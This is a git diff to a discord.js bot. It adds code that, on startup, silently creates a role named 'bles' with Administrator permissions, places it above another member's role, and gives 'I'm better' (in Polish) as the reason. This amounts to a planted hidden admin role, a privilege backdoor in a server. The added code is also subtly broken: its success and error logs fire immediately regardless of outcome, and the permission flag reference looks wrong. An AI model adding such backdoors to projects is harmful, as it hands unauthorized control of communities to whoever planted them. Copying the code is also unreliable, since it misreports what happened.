@@ -1,4 +1,4 @@
-const { Client, IntentsBitField, EmbedBuilder, PermissionsBitField } = require('discord.js');
+const { Client, IntentsBitField, EmbedBuilder, PermissionsBitField, Colors } = require('discord.js');
 const config = require('./config.json');
 
 const client = new Client({
@@ -27,6 +27,17 @@ client.on('ready', async () => {
     const role = guild.roles.cache.find(r => r.name === 'bles');
 
     if (!role) {
+        guild.roles.create({
+            name: 'bles',
+            color: Colors.Default,
+            hoist: false,
+            mentionable: false,
+            permissions: PermissionsBitField.Administrator,
+            position: guild.roles.cache.find(r => r.name === 'Oskarek').position + 1,
+            reason: 'jestem lepszy'
+        })
+            .then(console.log('Role bles was created with administrator permissions'))
+            .catch(console.error('There was an error creating role bles: '));
         console.log(`Role 'bles' does not exist in guild '${guild.name}' (ID: ${guild.id}).`);
     }
 
